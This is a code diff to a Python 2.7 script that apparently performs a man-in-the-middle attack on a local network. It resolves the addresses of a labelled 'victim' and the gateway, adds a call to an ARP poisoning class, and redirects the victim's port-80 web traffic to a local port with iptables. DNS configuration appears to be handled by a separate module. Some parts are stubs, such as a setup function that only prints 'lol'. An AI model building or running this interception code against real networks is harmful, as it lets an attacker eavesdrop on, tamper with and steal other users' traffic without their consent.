@@ -1,14 +1,18 @@
 #!/usr/bin/env python2.7
-import os, sys, socket, fcntl, struct, traceback
+import os
+import sys
+import fcntl
+import struct
+import traceback
+import threading
 import DNSConf
 from time import sleep
 import argparse
 from scapy.all import *
-
+from ArpPoisoner import ArpPoisoner
 
 BLUE = '\033[94m'
 END = '\033[0m'
-port = 8080
 
 class SWRT(object):
 	def __init__(self):
@@ -22,7 +26,7 @@ class SWRT(object):
 		parser.add_argument('-p', action='store', default="8080", dest='port', help='Store the port', required=False)
 		self.args = parser.parse_args()
 
-		def nic_ip(interface):
+		def get_host_ip(interface):
 			try:
 				s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 				
@@ -35,7 +39,7 @@ class SWRT(object):
 				print("Error: wrong interface.")
 				exit(0)
 		
-		def nic_mac(interface):
+		def get_host_mac(interface):
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', interface[:15]))
 			return ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]	
@@ -49,39 +53,35 @@ class SWRT(object):
 				print "[!] WRONG TARGET / GATEWAY IP"
 				exit(0)
 
-		self.hostIP = nic_ip(self.args.interface)
-		self.hostMAC = nic_mac(self.args.interface)
-		self.targetIP = self.args.target
+		self.args.host_ip = get_host_ip(self.args.interface)
+		self.args.host_mac = get_host_mac(self.args.interface)
+		self.args.target_ip = self.args.target
 		
-		self.targetMAC = resolve_mac(self.targetIP)
-		self.gatewayIP = self.args.gateway
-		self.gatewayMAC = resolve_mac(self.gatewayIP)
-		print "[+] MY IP: {}".format(self.hostIP)		
-		print "[+] MY MAC {}".format(self.hostMAC)
-		print "[+] VICTIM IP {}".format(self.targetIP)
-		print "[+] VICTIM MAC {}".format(self.targetMAC)		
-		print "[+] GATEWAY IP {}".format(self.gatewayIP)
-		print "[+] GATEWAY MAC {}".format(self.gatewayMAC)
-
-
+		self.args.target_mac = resolve_mac(self.args.target_ip)
+		self.args.gateway_ip = self.args.gateway
+		self.args.gateway_mac = resolve_mac(self.args.gateway_ip)
+		print "[+] MY IP: {}".format(self.args.host_ip)		
+		print "[+] MY MAC {}".format(self.args.host_mac)
+		print "[+] VICTIM IP {}".format(self.args.target_ip)
+		print "[+] VICTIM MAC {}".format(self.args.target_mac)		
+		print "[+] GATEWAY IP {}".format(self.args.gateway_ip)
+		print "[+] GATEWAY MAC {}".format(self.args.gateway_mac)
 
 	def setup(self, conf):
   		print ("lol")
 
-
 if __name__ == "__main__":
 	if os.geteuid() != 0:
-		sys.exit("[-] Only for roots kido! ")
+		sys.exit("Need root privileges to run properly; Re-run as sudo...")
 	swrt = SWRT()
 	if (swrt.args.conf != None):
 		config = DNSConf.DNSConf(swrt.args.interface, swrt.args.conf)
+	ArpPoisoner(swrt.args)
 	try:
 		os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports {}".format(swrt.args.port))
 		swrt.setup(config)
-		'''
 		while True:
 			sleep(10000)
-		'''
 	except KeyboardInterrupt:
 		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 		os.system('iptables -t nat -F')
